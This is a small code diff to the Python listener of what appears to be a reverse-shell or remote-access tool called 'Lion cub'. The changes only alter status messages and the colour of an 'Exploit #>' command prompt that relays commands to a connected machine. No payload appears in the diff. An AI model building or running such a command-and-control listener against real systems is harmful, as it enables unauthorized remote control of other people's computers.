@@ -23,7 +23,8 @@ class Listener:
         listen.bind((self.ip, self.port))
         listen.listen(0)
 
-        print(colored('[+]waiting for incoming connections', 'yellow'))
+        print(colored('[+]Lion cub server started {} at {}'.format(self.ip, self.port), 'green'))
+        print(colored('[+]Waiting for the incomming connections', 'yellow'))
         self.connection, address = listen.accept()
         print(colored('[+]connection established | {} {} |\n'.format(address[0], address[1]), 'green', attrs=['bold']))
 
@@ -76,7 +77,7 @@ class Listener:
     def start(self):
         try:
             while True:
-                command = raw_input(colored('Exploit #>', 'white', attrs=['bold', 'underline']) + ' ').split()
+                command = raw_input(colored('Exploit #>', attrs=['bold', 'underline']) + ' ').split()
 
                 if command[0] == 'quit':
                     self.reliable_send(command)
